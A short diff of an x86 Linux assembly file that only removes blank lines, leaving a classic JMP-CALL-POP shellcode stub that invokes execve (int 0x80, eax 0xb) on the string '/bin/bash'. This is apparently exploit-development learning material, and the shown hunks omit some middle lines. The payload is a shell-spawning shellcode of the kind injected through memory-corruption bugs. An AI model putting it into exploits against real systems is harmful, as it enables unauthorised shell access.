@@ -1,11 +1,8 @@
 global _start
 section .text
 _start:
-	jmp short call_shellcode
-	
-	
+	jmp short call_shellcode	
 shellcode:
-	
 	pop esi
 	xor ebx, ebx
 	mov byte [esi + 9 ], bl
@@ -17,17 +14,6 @@ shellcode:
 	xor eax, eax
 	mov al, 0xb
 	int 0x80
-	
-	
-
-
 call_shellcode:
 	call shellcode
 	message db "/bin/bashABBBBCCCC"
-	
-	
-	
-	
-	
-	
-	
